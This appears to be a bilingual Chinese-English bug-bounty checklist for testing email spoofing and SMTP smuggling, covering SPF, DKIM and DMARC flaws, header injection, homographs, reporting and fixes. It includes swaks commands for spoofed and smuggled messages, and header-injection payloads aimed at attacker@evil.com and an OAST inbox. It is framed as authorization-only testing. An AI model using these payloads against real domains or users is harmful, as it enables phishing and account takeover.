---
id: clk-email-spoof-smtp-smuggling
title: Email Spoofing & SMTP Smuggling
owasp_anchor: [WSTG-CONF, WSTG-IDNT]
cwe: [CWE-345, CWE-290]
severity_typical: P2-P3
playbook: playbooks/email_spoof.yaml
last_updated: 2026-05-14
sources: []
maturity: stable
---

# Email Spoofing & SMTP Smuggling Checklist

> 双语 / Bilingual: SPF / DKIM / DMARC + SMTP smuggling + IDN 同形异码 + email-based ATO 攻击面合一。
> 用法：先做"Recon & 邮件链路指纹"列出每跳 MTA，再分支到 DNS 校验 / SMTP 协议 / Header 注入 / 业务流。
> Authorization-only：只对自己控制的发送域 / 接收账户做 PoC；不要给真实用户发任何欺骗邮件。

---

## 1. Recon & 邮件链路指纹

- [ ] 抓 MX / SPF / DMARC / DKIM 选择器：`dig +short MX target.com` / `dig TXT target.com | grep spf1` / `dig TXT _dmarc.target.com` / `dig TXT <selector>._domainkey.target.com`
- [ ] BIMI / MTA-STS / TLS-RPT：`default._bimi.target.com` / `_mta-sts.target.com` / `_smtp._tls.target.com`
- [ ] 邮件链路画图：MUA → 出站中继 → MX → 反垃圾网关 → 内部 MTA（Postfix/Exim/Sendmail/Exchange/O365/Workspace）
- [ ] 列出业务发件路径：注册验证、密码重置、邀请、通知、月结账单、CSAT、webhook 回报
- [ ] 收集 from-domain：`@target.com`、`@notifications.*`、`@mailer.*`、第三方代发（SendGrid/Mailgun/SES/Postmark）

## 2. SPF 校验缺陷

- [ ] SPF 缺失（无 `v=spf1`）→ 任何源都能假冒
- [ ] SPF 过宽：`+all` / `?all` / `~all`（仅 spam 标记）
- [ ] `include:` 链超 10 次 DNS lookup → PermError → 收件方按 none
- [ ] `+a:` / `+mx:` 含可注册（dangling）域名
- [ ] 子域无 SPF，父域 SPF 不继承 → `notifications.target.com` 可任意发
- [ ] 第三方代发 include 名单中含已停用 SaaS（dangling）

## 3. DKIM 校验缺陷

- [ ] selector 短密钥（< 1024 bit）→ 因数分解伪造
- [ ] DKIM key 旋转后旧 selector 仍解析
- [ ] DKIM `l=` tag → 在签名长度外追加内容（[example: l-tag append 类]）
- [ ] DKIM `h=` 选择性签名 → 未签名 header 可被加 / 改（`From`、`Subject`、`Reply-To`）
- [ ] 多个 DKIM-Signature header → 收件方只验第一个
- [ ] DKIM-only（无 SPF）+ 转发链断签 → 邮件被替换

## 4. DMARC 校验缺陷

- [ ] DMARC 缺失 / `p=none` → 仅监控
- [ ] `p=quarantine` 配 `pct=0/1` → 几乎放行
- [ ] `sp=` 子域策略缺失 → 子域可任意发
- [ ] `aspf=r` / `adkim=r`（relaxed）允许子域伪装
- [ ] DMARC ARC：转发链 ARC 信任的中继被入侵
- [ ] `rua` / `ruf` 接收域可注册 → 接管 DMARC 报告

## 5. DNS / SMTP Smuggling

- [ ] CNAME flattening：`_dmarc.target.com` CNAME 到第三方过期域 → 接管 DMARC
- [ ] SPF flattening 服务失败 → SPF none
- [ ] DNSSEC 缺失 → 局部投毒
- [ ] BIMI 仅看 logo，不强制 VMC，伪造图标提升钓鱼可信度
- [ ] CR/LF 处理差异：`\n.\n` vs `\r\n.\r\n`，出站/入站 MTA 解析不一致 → 走私第二封邮件（[example: Postfix/Sendmail/Exim 2023 SMTP smuggling 类]）
- [ ] BDAT / chunking 边界截断 `\r\n.\r\n`
- [ ] 8BITMIME / SMTPUTF8 不一致 → 转码后 dot-stuffing 失效
- [ ] LMTP vs SMTP 混用网关 / 多跳中继信任链
- [ ] PIPELINING + AUTH 顺序错乱 → 命令注入
- [ ] STARTTLS stripping → 明文降级
- [ ] 长度限制：> 998 字节 line 触发不同 MTA 截断

## 6. Header 注入 / Display Name 欺骗

- [ ] `From: "support@target.com" <attacker@evil.com>` → 客户端只显示 display name
- [ ] `From: support＠target.com <attacker@evil.com>`（U+FF20 全角 @）
- [ ] 多 `From:` header → 客户端取第一/最后不一致
- [ ] `Reply-To: attacker@evil.com` 让回复落到攻击者
- [ ] `Sender:` / `Return-Path:` 与 `From:` 不一致
- [ ] CRLF 注入到 `Subject` / `From`（用户名拼进 header）→ 多收件人 / BCC 注入
- [ ] HTML 邮件 `<base href>` 重写资源 / 链接

## 7. IDN / Unicode 同形异码

- [ ] Punycode 域名（西里尔 а / 希腊 α / 全角字母）
- [ ] 邮件本地部分 Unicode：`admín@target.com` vs `admin@target.com`
- [ ] 大小写规范化：lowercase 后是否仍唯一
- [ ] 别名 `+tag`：`admin+attacker@target.com` 在 ATO 流程被截断
- [ ] `admin@gmail.com` vs `admin@googlemail.com` 同收件箱
- [ ] 注册时的同形 ID 抢占（admin / аdmin 共存）

## 8. Email Forwarding & 业务链 ATO

- [ ] forwarded 邮件被 SRS 重写后 SPF 校验断裂
- [ ] 邮件 forwarding 规则注入（IMAP / Outlook rule）→ 隐蔽窃听
- [ ] 注册流程：邮件验证 token 长度 / 熵 / 过期窗 / 一次性
- [ ] 改邮箱：是否要求确认旧邮箱 + 旧邮箱通知（账号丢失）
- [ ] 改邮箱后是否清空已发出的密码重置 token
- [ ] 密码重置链接是否绑定 IP / UA / 设备指纹
- [ ] 邮件超链接是否可被 HTML inject（quoted-printable 编码绕过）
- [ ] 邮件附件渲染（CID / 远程图片）触发 OAST 探针

## 9. 自动化辅助

```bash
# DMARC / SPF / DKIM 一键查
for d in target.com mailer.target.com notifications.target.com; do
  echo "=== $d ==="; dig +short TXT $d | grep -i spf; dig +short TXT _dmarc.$d
done

# checkdmarc 全套
pip install checkdmarc && checkdmarc -f json target.com | jq

# spoofcheck（评估可被 spoof）
python3 spoofcheck.py target.com

# 自有发件域 PoC（仅自托管 MTA / OAST）
swaks --to attacker@oast.live --from "support@target.com" \
      --header "Subject: spoof-$(date +%s)" --server <自托管 MTA> --tls

# SMTP smuggling（仅自有靶机）
swaks --to victim@inbox.local --from "a@evil" --server target-mx \
      --data "From: legit@target.com\r\nSubject: pwn\r\n\r\nbody\r\n.\r\n"

# Nuclei
nuclei -tags dmarc,spf,dkim,email,takeover -u target.com

# dangling include 检测
for inc in $(dig +short TXT target.com | tr ' ' '\n' | grep '^include:' | cut -d: -f2); do
  dig +short $inc TXT >/dev/null || echo "DANGLING include: $inc"
done

# Caido workflow: header-injection.yml — 注入 \r\nBcc: attacker@oast.live 后 assert OAST 收到
# Burp ext: Email Header Manipulator
```

## 10. Reporting Angle

* **Title 模板**：`<域 / 路径> allows email spoofing via <SPF/DKIM/DMARC/smuggling> impacting <business flow>`
  例：`notifications.target.com lacks DMARC enforcement, allowing spoofed password-reset emails`
* **Severity 自评**：
  * 主域任意 spoof + 业务接受外部链接（密码重置 / 发票）→ CVSS 3.1 7.0-8.5 / VRT P2
  * 子域可 spoof / 仅 phishing → CVSS 5.5-6.5 / VRT P3
  * SMTP smuggling 把外部邮件以内网身份注入 → CVSS 7.0-8.0 / VRT P2
  * IDN 同形异码 ATO 链 → CVSS 6.0-7.5 / VRT P2
  * 仅信息（缺 BIMI / 弱 selector）→ CVSS ≤ 3.5 / VRT P4-P5
* **CWE 推荐**：CWE-345 / CWE-290；header 注入追加 CWE-93
* **PoC 必须**：自托管发件源 + 自有收件箱 + 完整 raw header + Authentication-Results；不针对真实用户
* **Suggested Fix**（至少 2 条）：
  * 主域和所有子域统一 `p=reject` + `sp=reject`，`adkim=s adspf=s`，`pct=100`
  * 收紧 SPF（删除 dangling include）；DKIM ≥ 2048-bit，定期轮换 selector
  * MTA 升级（Postfix ≥ 3.8 / Exim ≥ 4.97 / Sendmail patched），启用严格 dot-stuffing；启用 MTA-STS + TLS-RPT
  * 应用层禁止用户输入直拼邮件 header；显示名 sanitization；改邮箱双向确认

## 11. 已迁移技法（来自 KB）

- [[techniques/spf_dangling_include|SPF include dangling 接管]]
- [[techniques/dkim_l_tag_append|DKIM l= 长度截断追加正文]]
- [[techniques/dmarc_subdomain_gap|DMARC sp= 缺失子域伪装]]
- [[techniques/smtp_smuggling_dot|SMTP smuggling CRLF 走私第二邮件]]
- [[techniques/idn_homograph_register|IDN 同形异码注册抢占]]
